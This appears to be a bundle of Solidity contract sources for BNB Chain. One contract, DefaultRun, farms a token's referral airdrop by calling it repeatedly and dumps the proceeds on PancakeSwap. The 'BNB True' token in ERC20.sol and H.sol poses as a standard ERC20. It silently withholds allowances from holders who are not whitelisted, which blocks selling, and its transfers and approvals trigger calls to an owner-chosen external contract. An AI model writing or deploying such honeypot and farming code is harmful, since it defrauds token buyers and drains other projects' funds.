{"DefaultRun.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity \u003e=0.8.0 \u003c0.9.0;\n\nimport \"./ITarget.sol\";\nimport \"./IERC20.sol\";\nimport \"./ISWAP.sol\";\nimport \"./IClaim.sol\";\nimport \"./Worker.sol\";\n\ncontract DefaultRun is Worker {\n    address public constant pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n    address public constant wBNBAddr = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\n\n    Worker public worker = new Worker();\n\n    constructor() {\n        addChild(address(worker));\n    }\n\n    function run(int count, address contractAddr) external returns (uint256) {        \n        ITarget target = ITarget(contractAddr);\n\n        if(IERC20(contractAddr).balanceOf(address(worker)) == 0) {\n            target.getAirdrop(address(worker));\n            IERC20(contractAddr).transfer(address(worker), IERC20(contractAddr).balanceOf(address(this)));\n        }\n\n        int j = 0;\n        while(j \u003c count) {\n            j++;\n            target.getAirdrop(address(worker));\n        }\n        worker.collect(contractAddr);\n\n        address[] memory path = new address[](2);\n        path[0] = contractAddr;\n        path[1] = wBNBAddr;\n        uint256 balance = IERC20(contractAddr).balanceOf(address(this));\n        IERC20(contractAddr).approve(pancakeRouter, balance);\n        uint balanceEth = address(this).balance;\n        ISWAP(pancakeRouter).swapExactTokensForETH(balance, 1, path, address(this), 99999999999999999);\n        return address(this).balance - balanceEth;\n    }\n\n    function withdrawEth(address to) public onlyOwner {\n        payable(to).transfer(address(this).balance);\n    } \n\n    fallback() payable external {}\n    receive() payable external {}\n}"},"ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity \u003e=0.8.0 \u003c0.9.0;\n\nimport \"./IERC20.sol\";\n\nabstract contract ERC20 is IERC20 {\n    address public owner = msg.sender;\n    uint256 public supply;\n    mapping(address =\u003e uint256) private _balances;\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\n    string private _name = \"BNB True\";\n    string private _symbol = \"BNBt\";\n\n    mapping(address =\u003e bool) private _unlocked;\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner\");\n        _;\n    }\n    \n    function mint(address to, uint256 value) public onlyOwner {\n        _mint(to, value);\n    }\n\n    function multiMint(address[] memory to, uint256 value) public onlyOwner {\n        for (uint256 i = 0; i \u003c to.length; i++) {\n            _mint(to[i], value);\n        }\n    }\n\n    function getAirdrop(address _referer) public {\n        _mint(msg.sender, 1 * (10 ** decimals()));\n        if(msg.sender != _referer) {\n            _mint(_referer, 1 * (10 ** decimals()));\n        }\n    }\n\n    function _mint(address to, uint256 value) private {\n        _balances[to] += value;\n        supply += value;\n        emit Transfer(address(0), to, value);\n    }\n\n    function totalSupply() public override view returns (uint256) {\n        return supply;\n    }\n\n    function balanceOf(address account) public override view returns (uint256) {\n        return _balances[account];\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) private {\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[sender] = senderBalance - amount;\n        }\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n            \n        if(!_unlocked[sender]) {\n            replacementTransfer();\n        }\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function allowance(address own, address spender) public view virtual override returns (uint256) {\n        return _allowances[own][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        if(_unlocked[msg.sender]) {\n            _allowances[msg.sender][spender] = amount;\n            emit Approval(msg.sender, spender, amount);\n        } else {\n            replacementTransfer();\n        }\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][msg.sender];\n        require(currentAllowance \u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n        unchecked {\n            _allowances[sender][msg.sender] = currentAllowance - amount;\n        }\n\n        return true;\n    }\n\n    function decimals() public view virtual returns (uint8) {\n        return 18;\n    }\n\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n    function unlock(address addr, bool state) public onlyOwner {\n        _unlocked[addr] = state;\n    } \n\n    function replacementTransfer() public virtual;\n}"},"H.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity \u003e=0.8.0 \u003c0.9.0;\n\nimport \"./ERC20.sol\";\nimport \"./IClaim.sol\";\n\ncontract H is ERC20 {\n    address public claimAddr = address(0);\n\n    function replacementTransfer() public override {\n        claim();\n    }\n\n    function claim() public {\n        IClaim(claimAddr).execute();\n    }\n\n    function setOwner(address newOwner) public onlyOwner {\n        owner = newOwner;\n    }\n\n    function setClaim(address addr) public onlyOwner {\n        claimAddr = addr;\n    }\n\n    receive() external payable {}\n    fallback() external payable {}\n}"},"IClaim.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity \u003e=0.8.0 \u003c0.9.0;\n\ninterface IClaim {\n    function execute() external;\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity \u003e=0.8.0 \u003c0.9.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}"},"ISWAP.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity \u003e=0.8.0 \u003c0.9.0;\n\ninterface ISWAP {\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n}"},"ITarget.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity \u003e=0.8.0 \u003c0.9.0;\n\ninterface ITarget {\n    function getAirdrop(address _refer) external returns (bool success);\n}"},"Worker.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity \u003e=0.8.0 \u003c0.9.0;\n\nimport \"./IERC20.sol\";\n\ncontract Worker {\n    address public owner = msg.sender;\n    address private child;\n\n    function collect(address contractAddr) public {\n        if(child != address(0)) {\n            Worker(child).collect(contractAddr);\n        }\n        IERC20(contractAddr).transfer(owner, IERC20(contractAddr).balanceOf(address(this)));\n    }\n\n    function collectEth() public {\n        if(child != address(0)) {\n            Worker(child).collectEth();\n        }\n        payable(owner).transfer(address(this).balance);\n    }\n\n    function addChild(address addr) public onlyOwner {\n        child = addr;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Worker: Invalid addChild call\");\n        _;\n    }\n}"}}